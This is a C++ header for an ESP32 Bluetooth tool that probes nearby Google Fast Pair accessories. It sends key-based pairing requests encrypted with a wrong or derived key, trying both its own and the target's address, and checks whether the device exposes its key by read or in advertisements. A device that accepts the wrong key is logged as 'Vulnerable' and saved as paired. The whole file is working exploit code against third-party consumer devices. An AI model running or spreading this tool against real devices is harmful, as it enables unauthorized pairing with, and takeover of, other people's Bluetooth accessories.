#ifndef BLE_TESTER_H
#define BLE_TESTER_H

#include <Arduino.h>
#include <NimBLEDevice.h>
#include <Preferences.h>
#include "BleManager.h"
#include "DisplayManager.h" // Include DisplayManager for logging

// Includes for Crypto and ECDH
#include "mbedtls/aes.h"
#include "mbedtls/ecdh.h"
#include "mbedtls/entropy.h"
#include "mbedtls/ctr_drbg.h"
#include "mbedtls/sha256.h"

class BleTester {
private:
    NimBLEClient* pClient = nullptr;
    NimBLEUUID uuidFastPair; 
    NimBLEUUID kbpUUID;  
    Preferences prefs;

    volatile bool notificationReceived = false;

    String getStorageKey(String mac) {
        String key = mac;
        key.replace(":", ""); 
        key.trim();
        return key;
    }

    class MyClientCallbacks : public NimBLEClientCallbacks {
        void onConnect(NimBLEClient* pClient) override {
            Serial.printf(">>> DEBUG: Connected to %s\n", pClient->getPeerAddress().toString().c_str());
        }
        void onDisconnect(NimBLEClient* pClient, int reason) override {
            Serial.printf(">>> DEBUG: Disconnected (Reason: %d)\n", reason);
        }
        bool onConnParamsUpdateRequest(NimBLEClient* pClient, const ble_gap_upd_params* params) override {
            return true; 
        }
    };

    void encryptPacketWithKey(uint8_t* input, uint8_t* output, uint8_t* key) {
        mbedtls_aes_context aes;
        mbedtls_aes_init(&aes);
        mbedtls_aes_setkey_enc(&aes, key, 128);
        mbedtls_aes_crypt_ecb(&aes, MBEDTLS_AES_ENCRYPT, input, output);
        mbedtls_aes_free(&aes);
    }

    uint8_t parseHexNibble(char c) {
        if (c >= '0' && c <= '9') return c - '0';
        if (c >= 'a' && c <= 'f') return c - 'a' + 10;
        if (c >= 'A' && c <= 'F') return c - 'A' + 10;
        return 0;
    }

    void logHex(const uint8_t* data, size_t len) {
        for(size_t i=0; i<len; i++) {
            Serial.printf("%02X ", data[i]);
        }
        Serial.println();
    }

    // Helper to perform a single handshake attempt with a specific address strategy
    // Now accepts read/ads status to print in the specific log block
    bool performHandshake(NimBLERemoteCharacteristic* pChar, uint8_t* aesKey, String targetAddressStr, String strategyName, DisplayManager* display, BleManager* manager, ScannedDevice* currentDev, bool keyReadable, bool keyInAds) {
        
        // --- LOGGING BLOCK START ---
        if(display) {
            display->log("Testing Mac: " + strategyName);
            display->log("Expose key via Read - " + String(keyReadable ? "YES" : "NO"));
            display->log("Broadcast key in Ads - " + String(keyInAds ? "YES" : "NO"));
        }
        Serial.printf("\n>>> [STRATEGY: %s] Starting (Addr: %s)\n", strategyName.c_str(), targetAddressStr.c_str());
        // --- LOGGING BLOCK END ---

        for(int subAttempt = 0; subAttempt < 2; subAttempt++) {
            
            // Logic Change: Discover MAC right before every test (do not wait for timeout)
            // This runs before subAttempt 0 AND subAttempt 1, effectively satisfying "between attempts"
            if (manager != nullptr && currentDev != nullptr) {
                // Short scan to refresh MAC if possible. 
                // Using 2s to minimize connection supervision timeout risks while connected.
                bool found = manager->reacquireTarget(currentDev, 2); 
                
                if (found) {
                    String newAddr = currentDev->address;
                    // Serial.printf(">>> PRE-TEST REACQUIRED: %s\n", newAddr.c_str()); // Commented out to match clean logs
                    
                    if (strategyName == "Remote") {
                        targetAddressStr = newAddr;
                    }
                    delay(200); 
                }
            }

            Serial.printf(">>> Attempt: %d/2 | Addr: %s\n", subAttempt + 1, targetAddressStr.c_str());
            
            notificationReceived = false;
            
            // Packet Construction
            uint8_t raw[16];
            raw[0] = 0x00; // Type: Key-based Pairing Request
            raw[1] = 0x00; // Flags: 0x00 (Seeker initiates)
            
            int byteIdx = 0;
            for (int i = 0; i < targetAddressStr.length() && byteIdx < 6; i++) {
                char c = targetAddressStr[i];
                if (c == ':') continue;
                uint8_t val = parseHexNibble(c) << 4;
                if (i + 1 < targetAddressStr.length()) val |= parseHexNibble(targetAddressStr[++i]);
                raw[2 + byteIdx] = val;
                byteIdx++;
            }
            
            uint8_t salt[8];
            for(int i=0; i<8; i++) salt[i] = (uint8_t)random(0xFF);
            for(int i=0; i<8; i++) raw[8+i] = salt[i];

            uint8_t encrypted[16];
            encryptPacketWithKey(raw, encrypted, aesKey);

            Serial.print("Tx Encrypted: ");
            logHex(encrypted, 16);

            // Write & Wait
            if(pChar->writeValue(encrypted, 16, true)) {
                unsigned long startWait = millis();
                while(millis() - startWait < 5000) { 
                    if(notificationReceived) {
                        Serial.println(">>> SUCCESS: Notification Received!");
                        if(display) display->log("Accept wrong key - YES");
                        return true;
                    }
                    delay(10); 
                }
                
                Serial.println(">>> Handshake Timeout.");
                
            } else {
                Serial.println(">>> Write Failed (GATT Error).");
                // Don't retry on hard GATT error, usually indicates disconnect
                if(display) display->log("Accept wrong key - NO (GATT)");
                return false; 
            }
        }
        
        Serial.println(">>> Handshake Failed after 2 sub-attempts.");
        if(display) display->log("Accept wrong key - NO");
        return false;
    }

public:
    BleTester() {
        uuidFastPair = NimBLEUUID((uint16_t)0xFE2C);
        kbpUUID = NimBLEUUID("fe2c1234-8366-4814-8eb0-01de32100bea");
    }

    void init() {
        // CHANGED: We do NOT begin(prefs) here anymore.
        // We open prefs only when needed in pairTarget to prevent holding the handle open,
        // which interferes with BleManager's ability to clear data persistently.
    }

    // Handles the full pairing flow: Test -> Update Prefs
    bool pairTarget(ScannedDevice& dev, BleManager& manager, DisplayManager* display = nullptr) {
        Serial.println("\n========== STARTING PAIRING SEQUENCE ==========");
        Serial.printf("[1/4] Target: %s\n", dev.address.c_str());
        if(display) display->log("Pairing: " + dev.name);

        // Open Preferences specifically for this operation
        prefs.begin("whisper", false);

        // CAPTURE ORIGINAL KEY (in case address changes during test)
        String originalKey = getStorageKey(dev.address);

        bool handshakeSuccess = testDevice(dev, &manager, display);

        // CAPTURE CURRENT KEY (might be different if reacquireTarget updated dev.address)
        String currentKey = getStorageKey(dev.address);

        if (handshakeSuccess) {
             Serial.println("[3/4] Handshake VERIFIED.");
             dev.isPaired = true;
             dev.isVulnerable = false; 
             
             // Save to storage on explicit success
             prefs.putBool(currentKey.c_str(), true);
             
             // Force commit and close
             prefs.end();

             if(display) display->log("Paired (Saved)");
             return true;
        } else {
             Serial.println("[!] FAILURE: Handshake rejected.");
             
             // Cleanup BOTH possible keys to ensure no false positives remain
             if(prefs.isKey(currentKey.c_str())) {
                 prefs.remove(currentKey.c_str());
                 Serial.println( "[!] Cleared current pairing key.");
             }
             if(originalKey != currentKey && prefs.isKey(originalKey.c_str())) {
                 prefs.remove(originalKey.c_str());
                 Serial.println("[!] Cleared original pairing key.");
             }

             // Force commit and close
             prefs.end();

             return false;
        }
    }

    bool testDevice(ScannedDevice& dev, BleManager* manager = nullptr, DisplayManager* display = nullptr) {
        bool success = false;
        bool attributesDiscovered = false; // Flag to skip discovery on retries
        
        if (display) {
            display->log("Testing: " + dev.name.substring(0, 15));
        }

        // Initialize client once outside the loop to persist cache
        if(pClient != nullptr) {
            NimBLEDevice::deleteClient(pClient);
            pClient = nullptr;
        }
        pClient = NimBLEDevice::createClient();
        
        if(!pClient) {
            Serial.println("Failed to create client.");
            return false;
        }

        pClient->setClientCallbacks(new MyClientCallbacks(), true);
        pClient->setConnectTimeout(8); 

        // Main Loop: 3 Attempts (as requested)
        for (int attempt = 0; attempt < 3; attempt++) {
            if (display) display->log("Attempt " + String(attempt + 1));
            
            // Check staleness before connecting
            if (manager != nullptr && (millis() - dev.lastSeen > 5000)) {
                 Serial.println(">>> Device stale (>5s). Checking freshness...");
                 manager->reacquireTarget(&dev, 4); // Updates dev directly if found
            }

            Serial.printf("DEBUG: Testing %s (Attempt %d/3)\n", dev.address.c_str(), attempt + 1);

            // --- CONNECT LOOP ---
            bool connected = false;
            
            for(int i=0; i<3; i++) {
                bool attemptConn = pClient->connect(dev.rawAddr, false);
                if (!attemptConn && pClient->isConnected()) attemptConn = true;

                if (attemptConn) {
                    unsigned long wait = millis(); 
                    while(!pClient->isConnected() && millis() - wait < 2000) delay(50);
                    if(pClient->isConnected()) {
                        connected = true;
                        break;
                    }
                }

                if(!attemptConn) {
                    pClient->disconnect(); 
                    delay(1000);
                }
            }

            if(!connected) {
                Serial.println("Connection Failed.");
                continue; 
            }

            // --- DISCOVERY & VALIDATION ---
            NimBLERemoteCharacteristic* pChar = nullptr;

            if (!attributesDiscovered) {
                Serial.println("Discovering Attributes...");
                if(pClient->discoverAttributes()) {
                    NimBLERemoteService* pSvc = pClient->getService(uuidFastPair);
                    if(pSvc) {
                        pChar = pSvc->getCharacteristic(kbpUUID);
                        if(pChar) {
                            attributesDiscovered = true;
                        }
                    }
                }

                if (!attributesDiscovered) {
                     Serial.println("Service/Characteristic NOT found.");
                     if(display) display->log("Attr Missing");
                     pClient->disconnect();
                     continue;
                }
            } else {
                Serial.println("Attributes cached. Skipping discovery.");
                NimBLERemoteService* pSvc = pClient->getService(uuidFastPair);
                if(pSvc) pChar = pSvc->getCharacteristic(kbpUUID);
            }

            if(!pChar) {
                Serial.println("Error: KBP Characteristic pointer lost.");
                attributesDiscovered = false; 
                pClient->disconnect();
                continue;
            }

            // --- SUBSCRIBE ---
            notificationReceived = false;
            if(pChar->canNotify() || pChar->canIndicate()) { 
                pChar->subscribe(true, [this](NimBLERemoteCharacteristic* pChar, uint8_t* pData, size_t length, bool isNotify){
                    Serial.printf(">>> RX DATA (Len %d): ", length);
                    this->logHex(pData, length);
                    this->notificationReceived = true;
                    
                    if(length > 0) {
                        uint8_t type = pData[0];
                        if(type == 0xFF) Serial.println(">>> RX: ERROR (NACK)");
                        else if(type == 0x01) Serial.println(">>> RX: Pairing Response (Success)");
                    }
                });
                delay(500); 
            }

            // ==========================================
            //       VULNERABILITY CHECKS (READ/ADS)
            // ==========================================
            bool keyReadable = false;
            if(pChar->canRead()) {
                std::string val = pChar->readValue();
                if(val.length() == 64) keyReadable = true;
            }
            
            bool keyInAds = (dev.fpServiceData.size() >= 64);
            
            // Note: We don't print these here anymore, we pass them to performHandshake
            // to be printed under the specific Strategy Header as requested.

            // Setup Peer Key for ECDH
            uint8_t peer_pub_key[64] = {0};
            bool havePeerKey = false;
            
            if(keyReadable) {
                std::string val = pChar->readValue();
                if(val.length() == 64) {
                    memcpy(peer_pub_key, val.data(), 64);
                    havePeerKey = true;
                }
            }
            if (!havePeerKey && keyInAds) {
                memcpy(peer_pub_key, dev.fpServiceData.data(), 64);
                havePeerKey = true;
            }

            // --- ECDH KEY EXCHANGE ---
            mbedtls_ecdh_context ctx;
            mbedtls_entropy_context entropy;
            mbedtls_ctr_drbg_context ctr_drbg;

            mbedtls_ecdh_init(&ctx);
            mbedtls_entropy_init(&entropy);
            mbedtls_ctr_drbg_init(&ctr_drbg);
            
            const char* pers = "fastpair";
            mbedtls_ctr_drbg_seed(&ctr_drbg, mbedtls_entropy_func, &entropy, (const unsigned char*)pers, strlen(pers));
            mbedtls_ecdh_setup(&ctx, MBEDTLS_ECP_DP_SECP256R1);
            mbedtls_ecdh_gen_public(&ctx.grp, &ctx.d, &ctx.Q, mbedtls_ctr_drbg_random, &ctr_drbg);
            
            uint8_t shared_secret[32];

            if (havePeerKey) {
                mbedtls_ecp_point Qp;
                mbedtls_ecp_point_init(&Qp);
                uint8_t full_key[65];
                full_key[0] = 0x04;
                memcpy(&full_key[1], peer_pub_key, 64);
                
                if(mbedtls_ecp_point_read_binary(&ctx.grp, &Qp, full_key, 65) == 0) {
                    if(mbedtls_ecdh_compute_shared(&ctx.grp, &ctx.z, &Qp, &ctx.d, mbedtls_ctr_drbg_random, &ctr_drbg) == 0) {
                         mbedtls_mpi_write_binary(&ctx.z, shared_secret, 32);
                    } else {
                         mbedtls_ctr_drbg_random(&ctr_drbg, shared_secret, 32);
                    }
                } else {
                     mbedtls_ctr_drbg_random(&ctr_drbg, shared_secret, 32);
                }
                mbedtls_ecp_point_free(&Qp);
            } else {
                mbedtls_ctr_drbg_random(&ctr_drbg, shared_secret, 32);
            }
            
            mbedtls_ecdh_free(&ctx);
            mbedtls_ctr_drbg_free(&ctr_drbg);
            mbedtls_entropy_free(&entropy);

            uint8_t aesKey[16];
            memcpy(aesKey, shared_secret, 16); 

            // ==========================================
            //       STRATEGY EXECUTION
            // ==========================================
            // The user requested: Test "Own" first, then "Remote".
            
            // Strategy 1: Own Address (Seeker)
            String ownAddr = NimBLEDevice::getAddress().toString().c_str();
            if (performHandshake(pChar, aesKey, ownAddr, "Own", display, manager, &dev, keyReadable, keyInAds)) {
                success = true;
            } 
            // Strategy 2: Remote Device Address (Provider)
            else {
                if (performHandshake(pChar, aesKey, dev.address, "Remote", display, manager, &dev, keyReadable, keyInAds)) {
                    success = true;
                }
            }

            pClient->disconnect();
            
            if (success) {
                // If either strategy worked, we are vulnerable
                break;
            } else {
                Serial.println("Cooling down (5s) before retry...");
                delay(5000); 
            }
        }
        
        if(pClient) {
            NimBLEDevice::deleteClient(pClient);
            pClient = nullptr;
        }

        if(display) {
            if(success) display->log("Final Status: Vulnerable");
            else display->log("Final Status: Safe");
        }
        return success;
    }
};

#endif